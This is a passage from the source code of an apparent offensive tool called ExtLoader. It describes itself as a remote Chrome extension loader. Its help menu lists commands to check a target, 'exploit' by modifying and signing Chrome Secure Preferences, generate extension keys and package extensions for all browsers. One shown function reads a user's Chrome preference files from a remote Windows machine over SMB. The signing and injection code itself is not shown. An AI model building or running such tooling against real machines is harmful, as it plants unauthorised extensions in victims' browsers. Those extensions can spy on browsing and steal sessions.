        log.error(f"Error creating package: {e}")
        if debug:
            log.debug(traceback.format_exc())
        raise typer.Exit(code=1)

def print_help():
    print_banner()
    console.print("[bold]ExtLoader - Remote Chrome extension loader[/bold]\n")
    
    table = Table(title="Available Commands", show_header=True, header_style="bold magenta")
    table.add_column("Command", style="cyan")
    table.add_column("Description", style="green")
    
    table.add_row("check", "Check target for Chrome Secure Preferences")
    table.add_row("exploit", "Modify and sign Chrome Secure Preferences")
    table.add_row("restore", "Restore a previously downloaded Chrome Preferences file")
    table.add_row("version", "Display the current version of ExtLoader")
    table.add_row("gen-sign", "Generate extension keys for Chrome")
    table.add_row("package", "Package extension with signed preferences for all browsers")
    
    console.print(table)
    
    console.print("\n[bold]Usage:[/bold]")
    console.print("  extloader [OPTIONS] COMMAND [ARGS]...")
    console.print("\nRun 'extloader COMMAND --help' for more information on a command.")

@app.callback(invoke_without_command=True)
def main(ctx: typer.Context):
    if ctx.invoked_subcommand is None:
        print_help()

def check_preferences_files(smb_conn, share_name, tree_id, user, sid, browser_id="chrome"):
    browser_config = BrowserConfigurator.get_browser_configs().get(browser_id)
    if not browser_config:
        log.error(f"Unknown browser ID: {browser_id}")
        return None
        
    # Convert paths to Windows format 
    prefs_path = browser_config.preferences_path.replace("/", "\\")
    secure_prefs_path = browser_config.secure_preferences_path.replace("/", "\\")
    
    # Add Users\{user} prefix and handle AppData path corectly
    if "AppData\\Roaming" in secure_prefs_path:
        base_path = "AppData\\Roaming"
    else:
        base_path = "AppData\\Local"
    
    secure_prefs_path = f"Users\\{user}\\{secure_prefs_path}"
    prefs_path = f"Users\\{user}\\{prefs_path}"
    
    try:
        file_id = smb_conn.openFile(tree_id, secure_prefs_path, desiredAccess=FILE_READ_DATA)
        secure_prefs_content = smb_conn.readFile(tree_id, file_id)
        smb_conn.closeFile(tree_id, file_id)
        
        secure_prefs_data = json.loads(secure_prefs_content)
        if not secure_prefs_data or "extensions" not in secure_prefs_data or "settings" not in secure_prefs_data.get("extensions", {}):
            log.info(f"Found minimal/empty Secure Preferences for {user}, will use regular Preferences")
            log.debug(f"Attempt fetching Prefs content from {prefs_path}")
            file_id = smb_conn.openFile(tree_id, prefs_path, desiredAccess=FILE_READ_DATA)
            prefs_content = smb_conn.readFile(tree_id, file_id)
            smb_conn.closeFile(tree_id, file_id)
            return ("Preferences", prefs_path, prefs_content)
        else:
            return ("Secure Preferences", secure_prefs_path, secure_prefs_content)
    except Exception as e:
        log.error(f"Error checking preferences files: {e}")
        return None


if __name__ == "__main__":
    app()
